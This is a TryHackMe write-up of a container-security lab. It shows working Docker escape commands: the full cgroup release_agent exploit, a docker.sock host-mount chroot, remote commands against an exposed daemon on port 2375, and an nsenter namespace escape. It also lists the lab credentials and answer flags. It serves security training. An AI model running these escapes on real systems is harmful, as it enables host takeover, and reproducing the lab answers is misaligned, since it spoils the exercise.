# TryHackMe - Container Vulnerabilities

![TryHackMe](https://img.shields.io/badge/TryHackMe-Container%20Vulnerabilities-red)
![Category](https://img.shields.io/badge/Category-Container%20Security-blue)
![Level](https://img.shields.io/badge/Level-Intermediate-orange)
![Time](https://img.shields.io/badge/Time-60%20min-green)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Hands-On](https://img.shields.io/badge/Hands--On-Practical%20Exploitation-yellow)

## 📋 Table of Contents
- [Room Overview](#room-overview)
- [Learning Objectives](#learning-objectives)
- [Prerequisites](#prerequisites)
- [Task 1: Introduction](#task-1-introduction)
- [Task 2: Container Vulnerabilities 101](#task-2-container-vulnerabilities-101)
- [Task 3: Vulnerability 1: Privileged Containers](#task-3-vulnerability-1-privileged-containers)
- [Task 4: Vulnerability 2: Escaping via Exposed Docker Daemon](#task-4-vulnerability-2-escaping-via-exposed-docker-daemon)
- [Task 5: Vulnerability 3: Remote Code Execution via Exposed Docker Daemon](#task-5-vulnerability-3-remote-code-execution-via-exposed-docker-daemon)
- [Task 6: Vulnerability 4: Abusing Namespaces](#task-6-vulnerability-4-abusing-namespaces)
- [Task 7: Conclusion](#task-7-conclusion)
- [Key Definitions](#key-definitions)
- [Self-Reflection](#self-reflection)

## 🎯 Room Overview

This hands-on room demonstrates common vulnerabilities found in Docker containers and how attackers can exploit these vulnerabilities to escape container isolation and gain access to the host system.

## 🎓 Learning Objectives

- Understand common vulnerabilities in Docker containers
- Learn what attackers can gain from exploiting container vulnerabilities
- Identify why these vulnerabilities exist (misconfigurations)
- Develop skills to search for vulnerabilities within Docker containers

## 📚 Prerequisites

- Completion of Intro to Docker room
- Comfort with Linux CLI
- Understanding of container fundamentals
- Root access within containers (for exploitation)

## 🖥️ Task 1: Introduction

**Objective:** Set up the vulnerable machine and understand the exploitation context.

**Key Concepts:**
- Focus on exploiting Docker daemon vulnerabilities
- Requires elevated permissions within containers
- Assumes root access in container for exploitation
- Practical hands-on exploitation exercises

**Machine Credentials:**
- **Username:** `root`
- **Password:** `tryhackme123!`

**Answer:** 
```
No answer needed
```

## 🔓 Task 2: Container Vulnerabilities 101

### Container Environment Recap
- Containers are isolated with minimal environments
- Container access ≠ Host OS access
- Limited tools available in containers
- Difficult interaction for attackers

### Common Container Vulnerabilities

| Vulnerability Type | Description |
|-------------------|-------------|
| **Misconfigured Containers** | Containers with unnecessary privileges (e.g., privileged mode) |
| **Vulnerable Images** | Backdoored Docker images performing malicious actions |
| **Network Connectivity** | Improperly networked containers exposed to internet |
| **Hard-coded Credentials** | Sensitive information embedded in application code |

### Attack Vectors
- Lateral movement between containers
- Host system compromise
- Data exfiltration
- Privilege escalation

**Answer:** 
```
No answer needed
```

## 🏴‍☠️ Task 3: Vulnerability 1: Privileged Containers (Capabilities)

### Linux Capabilities
- Granular root permissions for processes
- Determines container permissions to OS
- Two container modes: User mode vs Privileged mode

### Privileged Container Risks
- Bypasses Docker Engine communication
- Direct OS interaction
- Mount host filesystem
- Execute commands as host root

### Exploitation Steps
1. **Check capabilities:** `capsh --print`
2. **Mount host cgroups:** `mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp`
3. **Configure kernel execution:** `echo 1 > /tmp/cgrp/x/notify_on_release`
4. **Find host path:** `host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)`
5. **Create exploit script:** Write commands to `/exploit`
6. **Execute via cgroup:** Trigger execution through process creation

### Complete Exploit
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Questions & Answers**

**Perform the exploit in this task on the target machine. What is the value of the flag that has now been added to the container?**
```
THM{MOUNT_MADNESS}
```

## 🔌 Task 4: Vulnerability 2: Escaping via Exposed Docker Daemon

### Unix Sockets Overview
- Data transfer using filesystem instead of network
- Inter-process Communication (IPC)
- Faster than TCP/IP sockets
- Filesystem permission-based security

### Docker Socket Location
- Typically located in `/var/run/docker.sock`
- Varies by operating system
- Requires Docker group membership or root access

### Socket Exploitation
- Access to Docker socket = Full Docker control
- Create new containers with host filesystem access
- Mount host filesystem into container
- Execute commands on host through container

### Exploitation Command
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Command Breakdown
- `-v /:/mnt`: Mount host root to /mnt in container
- `--rm`: Remove container after exit
- `-it`: Interactive terminal
- `alpine`: Lightweight Docker image
- `chroot /mnt sh`: Change root to mounted host filesystem

**Questions & Answers**

**Name the directory path which contains the docker.sock file on the container.**
```
/var/run
```

**Perform the exploit in this task on the target machine. What is the value of the flag located at /root/flag.txt on the host operating system?**
```
THM{NEVER-ENOUGH-SOCKS}
```

## 🌐 Task 5: Vulnerability 3: Remote Code Execution via Exposed Docker Daemon

### Docker Engine TCP Sockets
- Remote administration capability
- Default port: 2375
- Common in automation and management tools
- Often insecurely configured

### Vulnerability Assessment
- **Port Scanning:** Check port 2375
- **API Verification:** `curl http://TARGET:2375/version`
- **Command Execution:** `docker -H tcp://TARGET:2375 ps`

### Enumeration Steps
1. **Port Scan:** `nmap -sV -p 2375 TARGET_IP`
2. **API Check:** `curl http://TARGET_IP:2375/version`
3. **Container List:** `docker -H tcp://TARGET_IP:2375 ps`

### Exploitation Commands
- **Network Discovery:** `docker -H tcp://TARGET:2375 network ls`
- **Image Analysis:** `docker -H tcp://TARGET:2375 images`
- **Container Execution:** `docker -H tcp://TARGET:2375 exec`
- **New Container Deployment:** `docker -H tcp://TARGET:2375 run`

**Questions & Answers**

**What port number, by default, does the Docker Engine use?**
```
2375
```

## 🔄 Task 6: Vulnerability 4: Abusing Namespaces

### Namespace Fundamentals
- Resource segregation mechanism
- Each process assigned namespace and PID
- Container isolation foundation
- Processes only see same-namespace processes

### Container Detection
- **Process Count:** Containers have fewer processes
- **PID 1:** First process in container
- **Process Names:** Container-specific applications

### Namespace Sharing Vulnerability
- Containers sharing host namespace
- Can see host processes
- Debugging and monitoring use cases
- Security risk when misconfigured

### nsenter Exploitation
```bash
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

### Command Breakdown
- `--target 1`: Target PID 1 (init process)
- `--mount`: Share mount namespace
- `--uts`: Share hostname namespace
- `--ipc`: Share inter-process communication
- `--net`: Share network namespace
- `/bin/bash`: Execute shell in host namespace

**Questions & Answers**

**Perform the exploit in this task on the target machine. What is the flag located in /home/tryhackme/flag.txt?**
```
THM{YOUR-SPACE-MY-SPACE}
```

## ✅ Task 7: Conclusion

### Why Vulnerabilities Exist
- **Quick Solutions:** Easy privilege assignment
- **Specific Use Cases:** Docker-in-Docker, firewall applications
- **Debugging Needs:** Host interaction requirements
- **Misunderstanding:** Security implications not fully understood

### Prevention Strategies
- Granular capability assignment
- Allowlist-based permissions
- Regular security audits
- Proper network configuration

### Real-World Applications
- Container security assessment
- Penetration testing techniques
- DevSecOps vulnerability identification
- Production environment hardening

**Answer:** 
```
No answer needed
```

## 📚 Key Definitions

**Linux Capabilities:** Granular root permissions assigned to processes in Linux kernel.

**Privileged Container:** Docker container with elevated access to host system resources.

**Unix Sockets:** IPC mechanism using filesystem for data transfer between processes.

**Docker Socket:** Communication endpoint for Docker daemon interaction.

**Namespaces:** Linux kernel feature that isolates system resources between processes.

**nsenter:** Command to execute processes in existing namespaces.

**cgroups:** Control groups for resource management and process isolation.

## 📝 Self-Reflection

### My Container Vulnerability Exploitation Journey

This room provided me with practical, hands-on experience in identifying and exploiting common Docker container vulnerabilities. The step-by-step approach from detection to exploitation gave me valuable skills in container security assessment.

**Key Technical Skills Developed:**

**Privileged Container Exploitation:** I learned how to leverage container capabilities to escape isolation and execute commands on the host system. Understanding cgroups and kernel interaction was particularly insightful.

**Docker Socket Abuse:** The exploitation of Docker sockets taught me how misconfigured permissions can lead to complete host compromise. The practical exercise reinforced the importance of proper socket security.

**Remote Docker Daemon Attacks:** I gained experience in enumerating and exploiting exposed Docker daemons, understanding how remote administration features can become critical vulnerabilities.

**Namespace Manipulation:** Learning to abuse shared namespaces gave me insight into how container isolation can be broken when improperly configured, and how to detect these misconfigurations.

**Real-World Application:** These exploitation techniques are directly applicable to container security assessments and penetration testing engagements. Understanding both the vulnerability and the underlying mechanism helps in developing effective defenses.

This knowledge significantly enhances my capabilities as a security professional working with containerized environments and prepares me for more advanced container security topics.

---

**Tags:** `#TryHackMe` `#ContainerVulnerabilities` `#DockerSecurity` `#ContainerEscapes` `#PrivilegeEscalation` `#HandsOnExploitation` `#DevSecOps`
